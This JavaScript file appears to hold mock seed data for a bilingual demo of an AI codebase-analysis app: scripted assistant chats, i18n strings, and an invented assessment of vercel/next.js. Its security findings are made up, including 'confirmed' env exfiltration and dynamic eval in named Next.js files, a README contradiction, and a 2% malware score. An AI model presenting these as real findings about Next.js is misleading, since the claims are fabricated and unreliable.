const CHAT_SEED_LIVE = [
  { role: 'user', kind: 'locate', text: { vi: 'Tìm route đăng nhập trong repo này.', en: 'Find the login route in this repo.' }, t: 1 },
  { role: 'ai', provisional: true, scope: { vi: 'Đã có cây thư mục, chưa có embedding', en: 'File tree available, embeddings not ready' },
    text: {
      vi: 'Theo cây thư mục: route đăng nhập có ở `apps/web/auth/login.tsx` (~214 dòng). Khi indexing xong tôi sẽ chỉ ra middleware tương ứng.',
      en: 'Based on the file tree: login route is at `apps/web/auth/login.tsx` (~214 lines). Once indexing finishes I\'ll point to the matching middleware.',
    },
    citations: [{ file: 'apps/web/auth/login.tsx', range: '1-214' }],
    t: 2,
  },
  { role: 'user', kind: 'audit', text: { vi: 'Có dấu hiệu mã độc nào không?', en: 'Any signs of malicious code?' }, t: 3 },
  { role: 'ai', provisional: true, scope: { vi: 'Heuristic AST đã quét, LLM chưa xác nhận', en: 'AST heuristics done, LLM confirmation pending' },
    text: {
      vi: 'Sơ bộ: 3 finding khả nghi (eval động, exfiltration env, base64 obfuscation). Tôi sẽ xác nhận lại bằng LLM khi index xong.',
      en: 'Provisional: 3 suspicious findings (dynamic eval, env exfiltration, base64 obfuscation). I\'ll re-verify with the LLM after indexing.',
    },
    citations: [
      { file: 'packages/next/src/server/render.tsx', range: '482-489' },
      { file: 'packages/next/src/build/telemetry.ts', range: '128-134' },
    ],
    t: 4,
  },
  { role: 'user', kind: 'explain', text: { vi: 'Giải thích kiến trúc tổng thể.', en: 'Explain the overall architecture.' }, t: 5 },
  { role: 'ai', provisional: true, scope: { vi: 'Cây thư mục + framework đã detect', en: 'File tree + detected frameworks only' },
    text: {
      vi: 'Cấu trúc monorepo: `apps/*` cho ứng dụng demo, `packages/next/*` là framework, `crates/*` là Rust (Turbopack). Tôi sẽ vẽ block diagram chi tiết khi pipeline hoàn tất.',
      en: 'Monorepo structure: `apps/*` for demos, `packages/next/*` for the framework itself, `crates/*` for Rust crates (Turbopack). A detailed block diagram will appear once the pipeline finishes.',
    },
    t: 6,
  },
];

// Chat for the completed (next.js) session — richer, includes compare and suggest
const CHAT_SEED_DONE = [
  { role: 'user', kind: 'explain', text: { vi: 'Tóm tắt kiến trúc bằng 5 dòng.', en: 'Summarize the architecture in 5 lines.' }, t: 1 },
  { role: 'ai', text: {
      vi: 'Monorepo Yarn/Turbo. **Frontend**: App Router + RSC. **Backend**: `next-server` xử lý request, hỗ trợ Edge & Node. **Build**: Turbopack viết bằng Rust. **Cache**: tiered (memory + FS, tag-based). **CLI**: `create-next-app`.',
      en: 'Yarn/Turbo monorepo. **Frontend**: App Router + RSC. **Backend**: `next-server` handles requests on Edge & Node. **Build**: Turbopack in Rust. **Cache**: tiered (memory + FS, tag-based). **CLI**: `create-next-app`.',
    },
    citations: [
      { file: 'packages/next/src/server/next-server.ts', range: '1-200' },
      { file: 'crates/next-core/lib.rs', range: '1-80' },
    ],
    t: 2,
  },
  { role: 'user', kind: 'locate', text: { vi: 'Hàm nào quyết định cache hit/miss?', en: 'Which function decides cache hit/miss?' }, t: 3 },
  { role: 'ai', text: {
      vi: '`resolveCachedResponse()` trong `cache-fs/index.ts:87`. Logic: memory → FS → revalidate-then-serve. Tag được hash bằng `xxhash64`.',
      en: '`resolveCachedResponse()` in `cache-fs/index.ts:87`. Logic: memory → FS → revalidate-then-serve. Tags are hashed with `xxhash64`.',
    },
    citations: [{ file: 'packages/next/src/server/cache-fs/index.ts', range: '87-156' }],
    t: 4,
  },
  { role: 'user', kind: 'suggest', text: { vi: 'Đề xuất cải thiện hiệu năng cache.', en: 'Suggest performance improvements for caching.' }, t: 5 },
  { role: 'ai', text: {
      vi: '3 ý tưởng: (1) thêm **bloom filter** trước FS lookup để giảm syscall; (2) giảm size header trong tag — hiện đang serialize JSON đầy đủ; (3) batch invalidate qua Postgres LISTEN/NOTIFY thay vì polling.',
      en: '3 ideas: (1) add a **bloom filter** in front of the FS lookup to skip syscalls; (2) shrink tag headers — currently full JSON serialization; (3) batch invalidate via Postgres LISTEN/NOTIFY instead of polling.',
    },
    t: 6,
  },
  { role: 'user', kind: 'audit', text: { vi: 'Có mã độc nào không?', en: 'Any malicious code?' }, t: 7 },
  { role: 'ai', text: {
      vi: '6 finding tổng cộng: **2 high đã xác nhận** (eval động, exfiltration env), **1 medium** (obfuscation base64), 1 medium chưa xác nhận, 2 low là false-positive. Mở tab Security để xem patch đề xuất.',
      en: '6 findings total: **2 high confirmed** (dynamic eval, env exfiltration), **1 medium** (base64 obfuscation), 1 medium unconfirmed, 2 low false-positives. See the Security tab for suggested patches.',
    },
    citations: [
      { file: 'packages/next/src/server/render.tsx', range: '482-489' },
      { file: 'packages/next/src/build/telemetry.ts', range: '128-134' },
    ],
    t: 8,
  },
  { role: 'user', kind: 'compare', text: { vi: 'So với dự án "acme/orders-api" của tôi thì sao?', en: 'How does this compare to my "acme/orders-api"?' }, t: 9 },
  { role: 'ai', text: {
      vi: 'Cả hai dùng `zod` cho schema validation. Pattern cache tiered ở next-server có thể áp dụng cho `/orders/list` của bạn — endpoint đó hiện đang gọi DB mỗi request. Tôi đã mở tab So sánh nếu bạn muốn xem chi tiết.',
      en: 'Both use `zod` for schema validation. The tiered cache pattern in next-server fits your `/orders/list` endpoint — it currently hits the DB on every request. I opened the Compare tab if you want details.',
    },
    t: 10,
  },
  { role: 'user', kind: 'explain', text: { vi: 'Giải thích Turbopack so với Webpack 5.', en: 'Explain Turbopack vs Webpack 5.' }, t: 11 },
  { role: 'ai', text: {
      vi: 'Turbopack viết bằng Rust, cache theo **function call** (memoization granular) thay vì theo file. Kết quả: hot update O(thay đổi) thay vì O(graph). Webpack 5 vẫn được giữ làm fallback.',
      en: 'Turbopack is in Rust and caches at **function-call** granularity (memoization), not at file level. Result: hot updates scale with changes, not with graph size. Webpack 5 stays as a fallback.',
    },
    citations: [{ file: 'crates/next-core/lib.rs', range: '1-80' }],
    t: 12,
  },
];

const PIPELINE_STAGES = [
  { id: 'cloning',    label: { vi: 'Cloning',     en: 'Cloning' } },
  { id: 'parsing',    label: { vi: 'Parsing AST', en: 'Parsing AST' } },
  { id: 'indexing',   label: { vi: 'Indexing',    en: 'Indexing' } },
  { id: 'summarizing',label: { vi: 'Tổng hợp',    en: 'Summarizing' } },
  { id: 'ready',      label: { vi: 'Sẵn sàng',    en: 'Ready' } },
];

const LIBRARY = [
  { id: 'sess-vercel-next', name: 'vercel/next.js',     status: 'ready',      lastScan: '2 giờ trước',  loc: 1284530, langs: ['ts','rs','tsx'], stars: 124800, role: 'framework' },
  { id: 'sess-acme-orders', name: 'acme/orders-api',    status: 'scanning',   lastScan: '1 phút',       loc: 84210,   langs: ['ts','sql'],     stars: 412,    role: 'service' },
  { id: 'sess-shadcn-ui',   name: 'shadcn-ui/ui',       status: 'ready',      lastScan: 'hôm qua',      loc: 42100,   langs: ['tsx','ts'],     stars: 76200,  role: 'ui-kit' },
  { id: 'sess-prisma',      name: 'prisma/prisma',      status: 'ready',      lastScan: '3 ngày trước', loc: 320500,  langs: ['ts','rs'],      stars: 38400,  role: 'orm' },
  { id: 'sess-zod',         name: 'colinhacks/zod',     status: 'ready',      lastScan: 'tuần trước',   loc: 18000,   langs: ['ts'],            stars: 31200,  role: 'library' },
  { id: 'sess-stripe-cli',  name: 'stripe/stripe-cli',  status: 'queued',     lastScan: '—',           loc: 0,        langs: ['go'],            stars: 2300,   role: 'tooling' },
];

const COMPARE = {
  a: 'vercel/next.js',
  b: 'acme/orders-api',
  shared: [
    { dep: 'zod',          a: '3.22.4', b: '3.21.0', risk: 'Low' },
    { dep: 'typescript',   a: '5.4.5',  b: '5.2.2',  risk: 'Low' },
    { dep: 'eslint',       a: '8.57.0', b: '8.50.0', risk: 'Low' },
  ],
  patternsToBorrow: [
    { from: 'next-server', to: 'orders-api', what: { vi: 'Cache tiered (memory+FS, tag-based)', en: 'Tiered cache (memory+FS, tag-based)' } },
    { from: 'next-server', to: 'orders-api', what: { vi: 'Streaming response cho list endpoint',  en: 'Streaming response for list endpoint' } },
    { from: 'next-server', to: 'orders-api', what: { vi: 'Edge middleware cho rate-limit',         en: 'Edge middleware for rate-limiting' } },
  ],
  divergence: [
    { aspect: { vi: 'Validation runtime', en: 'Runtime validation' }, a: 'zod + Server Action',       b: 'zod + Express middleware' },
    { aspect: { vi: 'Logging',            en: 'Logging' },             a: 'pino + OTel',                b: 'winston + console' },
    { aspect: { vi: 'Test runner',        en: 'Test runner' },         a: 'vitest + playwright',        b: 'jest' },
  ],
};

// ----------------- Quick action chips -----------------
const QUICK_CHIPS = [
  { id: 'arch',     icon: 'network',     label: { vi: 'Giải thích kiến trúc',         en: 'Explain architecture' } },
  { id: 'login',    icon: 'key',         label: { vi: 'Tìm route đăng nhập',          en: 'Find login route' } },
  { id: 'malware',  icon: 'shield-alert',label: { vi: 'Có mã độc không?',             en: 'Any malicious code?' } },
  { id: 'compare',  icon: 'swap',        label: { vi: 'So sánh với "acme/orders"',    en: 'Compare with "acme/orders"' } },
  { id: 'cache',    icon: 'database',    label: { vi: 'Logic cache hit/miss?',        en: 'Cache hit/miss logic?' } },
];

// ----------------- i18n -----------------
const I18N = {
  vi: {
    appName: 'AI Codebase Intelligence',
    tagline: 'Hiểu một codebase bất kỳ trong vài phút',
    subtitle: 'Dán URL GitHub. Hệ thống quét, lập chỉ mục và mở trợ lý hỏi-đáp song song với quá trình quét.',
    pasteRepo: 'Dán URL GitHub — ví dụ: https://github.com/vercel/next.js',
    analyze: 'Phân tích',
    cloud: 'Cloud LLM',
    local: 'Local LLM',
    feat: {
      arch:    { title: 'Phân tích kiến trúc', desc: 'AST + RAG sinh sơ đồ block, sequence diagram cho từng use case.' },
      qa:      { title: 'Q&A real-time',       desc: 'Hỏi đáp ngay trong khi pipeline đang chạy. Câu trả lời tạm cập nhật khi có dữ liệu.' },
      malware: { title: 'Phát hiện mã độc',     desc: 'Heuristic + LLM xác nhận: eval động, obfuscation, exfiltration, supply-chain.' },
      compare: { title: 'So sánh dự án',        desc: 'Đặt cạnh repo của bạn — tìm pattern có thể tái sử dụng và chỗ lệch.' },
    },
    demo: { title: 'Repo demo đã quét sẵn', cta: 'Mở phiên' },
    stages: {
      cloning: 'Cloning',
      parsing: 'Parsing AST',
      indexing: 'Indexing',
      summarizing: 'Tổng hợp',
      ready: 'Sẵn sàng',
    },
    nav: { library: 'Dự án của tôi', settings: 'Cài đặt', docs: 'Tài liệu' },
    common: {
      back: 'Quay lại', open: 'Mở', save: 'Lưu', cancel: 'Hủy', loading: 'Đang tải…', empty: 'Chưa có dữ liệu',
      newScan: 'Quét repo mới', cmdK: '⌘K để mở Command', search: 'Tìm kiếm…', filter: 'Lọc', sort: 'Sắp xếp',
      copy: 'Sao chép', download: 'Tải về', viewCode: 'Xem code', expand: 'Mở rộng', collapse: 'Thu gọn',
      tree: 'Cây thư mục', assistant: 'Trợ lý AI', context: 'Ngữ cảnh',
    },
    tabs: { overview: 'Overview', architecture: 'Architecture', flow: 'Flow', modules: 'Modules', security: 'Security', documentation: 'Documentation' },
    overview: {
      stats: { loc: 'Dòng code', files: 'File', modules: 'Module', contributors: 'Contributors' },
      langs: 'Ngôn ngữ', frameworks: 'Framework phát hiện', readme: 'README.md',
    },
    arch: { compact: 'Compact', detailed: 'Detailed', legend: 'Phân lớp', loading: 'Đang dựng sơ đồ kiến trúc…' },
    flow: { selectUseCase: 'Chọn use case', loading: 'Đang dựng sequence…' },
    mod: {
      header: { name: 'Module', purpose: 'Vai trò', lang: 'Ngôn ngữ', files: 'Files', fns: 'Functions', risk: 'Risk' },
      filterAll: 'Tất cả', search: 'Tìm module…',
    },
    sec: {
      title: 'Security findings', confirmed: 'LLM Confirmed', heuristic: 'Heuristic', falsePositive: 'False positive',
      suggest: 'Đề xuất khắc phục', why: 'Vì sao', code: 'Đoạn code liên quan', refs: 'Tham chiếu',
      patchPreview: 'Patch preview', applyPR: 'Tạo Pull Request', viewFile: 'Xem file',
      filterAll: 'Tất cả', empty: 'Không phát hiện rủi ro nào.',
    },
    doc: { generated: 'Tài liệu tự sinh', dlMd: 'Tải .md', dlPdf: 'Tải .pdf', pr: 'Tạo Pull Request', view: 'Xem README' },
    chat: {
      placeholder: 'Hỏi về repo này… (⌘/ để focus)',
      provisional: 'Trả lời tạm thời — pipeline chưa kết thúc',
      scope: 'Phạm vi tri thức hiện tại',
      finalSummary: '📋 Tổng hợp cuối phiên',
      finalSubtitle: 'Pipeline đã hoàn tất — tôi đã rà lại các câu hỏi tạm trước đó và nâng cấp câu trả lời.',
      fullAnalysis: 'Phân tích đầy đủ',
      contextLink: 'Liên hệ với cuộc trò chuyện trước đó',
      provisionalAnswer: 'Câu trả lời tạm',
      upgradedAnswer: 'Câu trả lời nâng cấp',
      ctxRepo: 'Repo này',
      ctxCompare: 'So với dự án của tôi: acme/orders-api',
      send: 'Gửi',
      thinking: 'Đang nghĩ…',
      typeahead: 'Đề xuất',
      noMessages: 'Bắt đầu hỏi để khám phá repo.',
    },
    cmd: {
      placeholder: 'Gõ lệnh hoặc tìm…',
      sec: { recent: 'Gần đây', nav: 'Điều hướng', actions: 'Hành động', repos: 'Repo' },
      empty: 'Không tìm thấy.',
    },
    library: {
      title: 'Dự án của tôi',
      subtitle: 'Repo đã được index trong workspace.',
      addNew: 'Thêm repo mới',
      cols: { name: 'Repo', status: 'Trạng thái', loc: 'LOC', langs: 'Ngôn ngữ', last: 'Quét gần nhất' },
      filterStatus: 'Trạng thái',
      empty: 'Chưa có repo nào — dán URL GitHub để bắt đầu.',
    },
    compare: {
      title: 'So sánh repository',
      pickA: 'Repo A', pickB: 'Repo B',
      shared: 'Dependency dùng chung', patterns: 'Pattern có thể mượn', divergence: 'Khác biệt',
      from: 'Từ', to: 'Áp dụng cho',
    },
    settings: {
      title: 'Cài đặt',
      provider: 'LLM Provider',
      mode: 'Chế độ chạy',
      cloud: 'Cloud',
      local: 'Local',
      key: 'API Key',
      model: 'Model',
      test: 'Test kết nối',
      embed: 'Embeddings',
      privacy: 'Quyền riêng tư',
      save: 'Lưu cài đặt',
    },
    ass: {
      title: 'AI Intelligence Report',
      confidence: 'Độ tự tin của AI',
      contradiction: 'Phát hiện mâu thuẫn',
      suitability: 'Mức độ phù hợp',
      goodFor: 'Rất phù hợp cho',
      badFor: 'Không phù hợp cho',
      metrics: 'Đánh giá đa chiều',
      cat: 'Tiêu chí',
      res: 'Kết quả',
    },
  },
  en: {
    appName: 'AI Codebase Intelligence',
    tagline: 'Understand any codebase in minutes',
    subtitle: 'Paste a GitHub URL. We scan, index, and open a Q&A assistant in parallel with the scan.',
    pasteRepo: 'Paste a GitHub URL — e.g. https://github.com/vercel/next.js',
    analyze: 'Analyze',
    cloud: 'Cloud LLM',
    local: 'Local LLM',
    feat: {
      arch:    { title: 'Architecture analysis', desc: 'AST + RAG produce block diagrams and sequence diagrams per use case.' },
      qa:      { title: 'Real-time Q&A',         desc: 'Ask while the pipeline is still running. Provisional answers upgrade as data lands.' },
      malware: { title: 'Malware detection',     desc: 'Heuristic + LLM confirm: dynamic eval, obfuscation, exfiltration, supply-chain.' },
      compare: { title: 'Compare projects',      desc: 'Place side-by-side with your repo — find patterns to borrow and divergence.' },
    },
    demo: { title: 'Pre-indexed demo repos', cta: 'Open session' },
    stages: { cloning: 'Cloning', parsing: 'Parsing AST', indexing: 'Indexing', summarizing: 'Summarizing', ready: 'Ready' },
    nav: { library: 'My projects', settings: 'Settings', docs: 'Docs' },
    common: {
      back: 'Back', open: 'Open', save: 'Save', cancel: 'Cancel', loading: 'Loading…', empty: 'Nothing here',
      newScan: 'New scan', cmdK: '⌘K to open Command', search: 'Search…', filter: 'Filter', sort: 'Sort',
      copy: 'Copy', download: 'Download', viewCode: 'View code', expand: 'Expand', collapse: 'Collapse',
      tree: 'File tree', assistant: 'AI Assistant', context: 'Context',
    },
    tabs: { overview: 'Overview', architecture: 'Architecture', flow: 'Flow', modules: 'Modules', security: 'Security', documentation: 'Documentation' },
    overview: {
      stats: { loc: 'Lines of code', files: 'Files', modules: 'Modules', contributors: 'Contributors' },
      langs: 'Languages', frameworks: 'Detected frameworks', readme: 'README.md',
    },
    arch: { compact: 'Compact', detailed: 'Detailed', legend: 'Layers', loading: 'Building architecture diagram…' },
    flow: { selectUseCase: 'Select use case', loading: 'Building sequence…' },
    mod: {
      header: { name: 'Module', purpose: 'Purpose', lang: 'Language', files: 'Files', fns: 'Functions', risk: 'Risk' },
      filterAll: 'All', search: 'Search modules…',
    },
    sec: {
      title: 'Security findings', confirmed: 'LLM Confirmed', heuristic: 'Heuristic', falsePositive: 'False positive',
      suggest: 'Suggest fix', why: 'Why', code: 'Relevant code', refs: 'References',
      patchPreview: 'Patch preview', applyPR: 'Open Pull Request', viewFile: 'View file',
      filterAll: 'All', empty: 'No risks detected.',
    },
    doc: { generated: 'Generated documentation', dlMd: 'Download .md', dlPdf: 'Download .pdf', pr: 'Open PR', view: 'View README' },
    chat: {
      placeholder: 'Ask about this repo… (⌘/ to focus)',
      provisional: 'Provisional — pipeline still running',
      scope: 'Current knowledge scope',
      finalSummary: '📋 Final session summary',
      finalSubtitle: 'Pipeline finished — I revisited the provisional answers and upgraded them.',
      fullAnalysis: 'Full analysis',
      contextLink: 'Linked to earlier conversation',
      provisionalAnswer: 'Provisional answer',
      upgradedAnswer: 'Upgraded answer',
      ctxRepo: 'This repo',
      ctxCompare: 'vs my project: acme/orders-api',
      send: 'Send',
      thinking: 'Thinking…',
      typeahead: 'Suggestions',
      noMessages: 'Ask anything to start exploring.',
    },
    cmd: {
      placeholder: 'Type a command or search…',
      sec: { recent: 'Recent', nav: 'Navigation', actions: 'Actions', repos: 'Repos' },
      empty: 'Nothing matches.',
    },
    library: {
      title: 'My projects',
      subtitle: 'Repos indexed in this workspace.',
      addNew: 'Add new repo',
      cols: { name: 'Repo', status: 'Status', loc: 'LOC', langs: 'Languages', last: 'Last scan' },
      filterStatus: 'Status',
      empty: 'No repos yet — paste a GitHub URL to begin.',
    },
    compare: {
      title: 'Compare repositories',
      pickA: 'Repo A', pickB: 'Repo B',
      shared: 'Shared dependencies', patterns: 'Patterns to borrow', divergence: 'Divergence',
      from: 'From', to: 'Apply to',
    },
    settings: {
      title: 'Settings',
      provider: 'LLM Provider',
      mode: 'Run mode',
      cloud: 'Cloud',
      local: 'Local',
      cloudDesc: 'Send prompts to a provider — fastest, latest models.',
      localDesc: 'Run locally (Ollama/llama.cpp). Code never leaves your machine. Needs decent GPU/CPU.',
      apiKey: 'API key',
      apiKeyPlaceholder: 'sk-…',
      embeds: 'Embeddings',
      lang: 'Interface language',
      theme: 'Theme',
      privacy: 'Privacy',
      privacyDesc: 'Source is analyzed in this workspace. We never log code externally.',
      saved: 'Saved',
    },
    final: {
      finishing: 'Composing final summary…',
    },
    ass: {
      title: 'AI Intelligence Report',
      confidence: 'AI Confidence',
      contradiction: 'Contradiction Detected',
      suitability: 'Project Suitability',
      goodFor: 'Highly suitable for',
      badFor: 'Not suitable for',
      metrics: 'Comprehensive Assessment',
      cat: 'Category',
      res: 'Result',
    },
  },
};

const AI_ASSESSMENT = {
  beginnerGuide: {
    analogy: {
      vi: 'Next.js giống như một căn nhà lắp ghép trọn gói (Pre-built House). Thay vì bạn phải tự mua từng viên gạch (HTML), tự trộn vữa (CSS), và tự thuê thợ lắp ống nước (Database, Routing), Next.js cung cấp sẵn cho bạn một bộ khung vững chắc. Nó còn thông minh đến mức tự động biết phòng nào cần xây cố định cho chắc (Static Pages) và phòng nào cần nội thất thay đổi liên tục (Dynamic Pages).',
      en: 'Next.js is like a premium pre-built modular house. Instead of buying individual bricks (HTML), mixing cement (CSS), and hiring plumbers for infrastructure (Database, Routing) from scratch, Next.js gives you a robust skeleton out of the box. It\'s smart enough to know which rooms should be solidly fixed (Static Pages) and which need constantly changing furniture (Dynamic Pages).'
    },
    simplePurpose: {
      vi: 'Giúp tạo ra các trang web tải siêu nhanh, chuẩn SEO (Google rất thích), mà lập trình viên không phải tốn hàng tuần để setup các cấu hình máy chủ phức tạp.',
      en: 'Helps create blazing fast, highly SEO-optimized websites (Google loves them) without developers spending weeks setting up complex server configurations.'
    },
    coreValue: [
      { vi: 'Tiết kiệm 40% thời gian setup ban đầu', en: 'Saves 40% of initial setup time' },
      { vi: 'Trải nghiệm người dùng mượt như dùng app điện thoại', en: 'App-like smooth user experience' },
      { vi: 'Tự động tối ưu hình ảnh, font chữ giúp web load cực nhanh', en: 'Auto-optimizes images and fonts for blazing fast loading' }
    ]
  },
  confidence: 87,
  contradictions: [
    {
      type: 'high',
      vi: 'README khẳng định "100% an toàn và không thực thi mã độc" nhưng mã nguồn sử dụng `new Function()` để load template động từ URL không xác định tại runtime.',
      en: 'README claims "100% secure and no arbitrary execution" but source code uses `new Function()` to load dynamic templates from an unverified runtime URL.',
    },
  ],
  suitability: {
    goodFor: [
      { vi: 'Sản phẩm Production cấp Enterprise', en: 'Enterprise-grade Production apps' },
      { vi: 'Ứng dụng SSR / ISR / SSG quy mô lớn', en: 'Large scale SSR / ISR / SSG apps' },
      { vi: 'Dự án cần SEO mạnh mẽ', en: 'Projects requiring strong SEO' },
    ],
    badFor: [
      { vi: 'Embedded systems hoặc thiết bị IoT', en: 'Embedded systems or IoT devices' },
      { vi: 'Hệ thống HFT (High Frequency Trading)', en: 'High Frequency Trading (HFT)' },
      { vi: 'Single Page App cực kỳ đơn giản (overkill)', en: 'Extremely simple Single Page Apps (overkill)' },
    ],
  },
  metrics: [
    { cat: { vi: 'Mục đích cốt lõi', en: 'Core Purpose' }, res: { vi: 'React Framework cho web apps', en: 'React Framework for web apps' }, icon: 'target' },
    { cat: { vi: 'Kiến trúc hệ thống', en: 'Architecture' }, res: { vi: 'Modular, Server-First (RSC)', en: 'Modular, Server-First (RSC)' }, icon: 'layers' },
    { cat: { vi: 'Khả năng mở rộng (Scale)', en: 'Scalability' }, res: { vi: 'Rất cao (Edge & Serverless ready)', en: 'Very High (Edge & Serverless ready)' }, icon: 'activity' },
    { cat: { vi: 'Tính sẵn sàng (Production)', en: 'Production Ready' }, res: { vi: 'Đã sẵn sàng, được dùng bởi top tech', en: 'Ready, used by top tech companies' }, icon: 'check-circle' },
    { cat: { vi: 'Độ tin cậy & Bảo trì', en: 'Maintainability' }, res: { vi: 'Tốt (TypeScript strict, có tests)', en: 'Good (Strict TypeScript, tested)' }, icon: 'shield' },
    { cat: { vi: 'Xác suất mã độc', en: 'Malware Probability' }, res: { vi: '2% (Có cảnh báo dependency)', en: '2% (Dependency warning detected)' }, icon: 'bug', highlight: 'amber' },
    { cat: { vi: 'Stack công nghệ', en: 'Tech Stack' }, res: { vi: 'React, Node.js, Rust (Turbopack)', en: 'React, Node.js, Rust (Turbopack)' }, icon: 'code-2' },
    { cat: { vi: 'Trạng thái dự án', en: 'Project Health' }, res: { vi: 'Active (Community rất mạnh)', en: 'Active (Extremely strong community)' }, icon: 'heart' },
    { cat: { vi: 'Rủi ro Dependency', en: 'Dependency Risk' }, res: { vi: 'Trung bình (Cần review event-stream)', en: 'Medium (Needs event-stream review)' }, icon: 'alert-triangle', highlight: 'amber' },
  ],
  categories: [
    {
      id: 'purpose',
      name: { vi: 'Mục đích & Phù hợp', en: 'Purpose & Suitability' },
      qa: [
        { q: 'Repo này dùng để làm gì?', a: { vi: 'Framework React toàn diện để xây dựng ứng dụng web, hỗ trợ SSR, SSG và RSC.', en: 'Comprehensive React framework for building web apps with SSR, SSG and RSC.' }, icon: 'target', tags: ['React', 'Framework', 'Full-stack'] },
        { q: 'Vì sao repo được tạo?', a: { vi: 'Giải quyết bài toán routing và rendering phức tạp cho React, mang lại trải nghiệm out-of-the-box cho web developer.', en: 'To solve complex routing and rendering for React, providing an out-of-the-box experience.' }, icon: 'zap', tags: ['SSR', 'Routing', 'DX'] },
        { q: 'Có phù hợp với dự án của mình không?', a: { vi: 'Phù hợp nếu bạn cần SEO, web app quy mô lớn hoặc thương mại điện tử. Không phù hợp cho app quá đơn giản.', en: 'Suitable if you need SEO, large scale web apps or ecommerce. Not suitable for simple SPAs.' }, icon: 'check-circle', status: { text: 'High Fit', color: 'teal' } },
        { q: 'Dùng AI/ML hay web/backend?', a: { vi: 'Web/Backend (Full-stack framework cho web, tích hợp được API route).', en: 'Web/Backend (Full-stack framework for web with integrated API routes).' }, icon: 'globe', tags: ['Web', 'Backend'] }
      ]
    },
    {
      id: 'arch',
      name: { vi: 'Kiến trúc & Công nghệ', en: 'Architecture & Tech' },
      qa: [
        { q: 'Kiến trúc hệ thống ra sao?', a: { vi: 'Kiến trúc Modular, kết hợp App Router (file-system based) và Server-First approach.', en: 'Modular architecture, combining App Router (file-system based) and Server-First approach.' }, icon: 'network', tags: ['App Router', 'RSC', 'Modular'] },
        { q: 'Có thể mở rộng hay scale không?', a: { vi: 'Rất cao. Tối ưu hóa sẵn cho kiến trúc Serverless và Edge computing.', en: 'Very high. Optimized for Serverless and Edge computing architectures.' }, icon: 'activity', status: { text: 'Very High', color: 'teal' }, tags: ['Serverless', 'Edge'] },
        { q: 'Công nghệ gì?', a: { vi: 'React, Node.js, Webpack, Rust (Turbopack & SWC).', en: 'React, Node.js, Webpack, Rust (Turbopack & SWC).' }, icon: 'layers', tags: ['React', 'Node.js', 'Rust'] },
        { q: 'Hiệu năng (Performance) thế nào?', a: { vi: 'Tối ưu hóa cực tốt. Tích hợp sẵn font, image, script optimization và pre-fetching.', en: 'Highly optimized. Built-in font, image, script optimization and pre-fetching.' }, icon: 'gauge', status: { text: 'Excellent', color: 'teal' } }
      ]
    },
    {
      id: 'quality',
      name: { vi: 'Chất lượng & Bảo mật', en: 'Quality & Security' },
      qa: [
        { q: 'Chất lượng code thế nào?', a: { vi: 'Chất lượng cao, type-safe (TypeScript strict), kiến trúc modular rõ ràng và có độ phủ test rộng.', en: 'High quality, type-safe (Strict TypeScript), clear modular architecture with wide test coverage.' }, icon: 'code', status: { text: 'High Quality', color: 'blue' }, tags: ['TypeScript', 'Coverage'] },
        { q: 'Có nguy cơ mã độc/backdoor không?', a: { vi: 'Phân tích mã nguồn tĩnh không phát hiện backdoor trực tiếp, tuy nhiên có rủi ro từ một số dependency cũ.', en: 'Static analysis found no direct backdoor, however there is risk from some outdated dependencies.' }, icon: 'shield', status: { text: 'Low Risk', color: 'teal' } },
        { q: 'Dependency có rủi ro không?', a: { vi: 'Phát hiện 2 rủi ro mức độ thấp ở các thư viện phụ thuộc sâu (cần cập nhật).', en: 'Detected 2 low-level risks in deep dependencies (requires update).' }, icon: 'alert-triangle', status: { text: 'Medium', color: 'amber' }, tags: ['Audit needed'] },
        { q: 'Testing coverage có tốt không?', a: { vi: 'Tốt. Bao gồm unit tests (Jest), integration tests, và e2e tests (Playwright/Cypress).', en: 'Good. Includes unit tests (Jest), integration tests, and e2e tests (Playwright/Cypress).' }, icon: 'check', status: { text: 'Good', color: 'teal' } }
      ]
    },
    {
      id: 'business',
      name: { vi: 'Business & Cộng đồng', en: 'Business & Community' },
      qa: [
        { q: 'Có production-ready không?', a: { vi: 'Hoàn toàn sẵn sàng. Đã và đang được sử dụng bởi hàng ngàn công ty lớn.', en: 'Fully ready. Actively used by thousands of major enterprises.' }, icon: 'briefcase', status: { text: 'Ready', color: 'teal' } },
        { q: 'Community mạnh không?', a: { vi: 'Cực kỳ mạnh. 100k+ stars trên GitHub, cộng đồng hỗ trợ lớn và hệ sinh thái phong phú.', en: 'Extremely strong. 100k+ stars on GitHub, huge support community and ecosystem.' }, icon: 'heart', status: { text: 'Strong', color: 'teal' }, tags: ['100k+ stars', 'Vercel'] },
        { q: 'License có ổn không?', a: { vi: 'MIT License. Hoàn toàn an toàn để dùng cho các dự án thương mại mã nguồn đóng.', en: 'MIT License. Completely safe for closed-source commercial projects.' }, icon: 'lock', status: { text: 'Safe', color: 'teal' }, tags: ['MIT'] },
        { q: 'Có nên fork / clone / integrate không?', a: { vi: 'Nên dùng `npx create-next-app` để integrate thay vì fork, trừ khi muốn đóng góp trực tiếp vào core.', en: 'Integrate via `npx create-next-app` instead of forking, unless contributing to core.' }, icon: 'git-branch', tags: ['Integrate'] },
        { q: 'Có roadmap phát triển không?', a: { vi: 'Có rõ ràng. Hiện đang tập trung mạnh vào React Server Components (RSC) và Turbopack.', en: 'Clear roadmap. Currently focusing heavily on React Server Components (RSC) and Turbopack.' }, icon: 'map', tags: ['RSC', 'Turbopack'] },
        { q: 'Có dead project không?', a: { vi: 'Không. Dự án liên tục có commits mỗi ngày và release bản mới hàng tuần.', en: 'No. The project has daily commits and weekly new releases.' }, icon: 'activity', status: { text: 'Active', color: 'teal' }, tags: ['Daily commits'] }
      ]
    }
  ]
};

window.DATA = {
  SCAN_DONE, SCAN_LIVE, FILE_TREE, MODULES, SECURITY_FINDINGS,
  ARCH_NODES, ARCH_EDGES, FLOWS, README_MD, GENERATED_DOC,
  CHAT_SEED_LIVE, CHAT_SEED_DONE, PIPELINE_STAGES, LIBRARY, COMPARE, QUICK_CHIPS,
  FRAMEWORK_DETAILS, AI_ASSESSMENT
};
window.I18N = I18N;
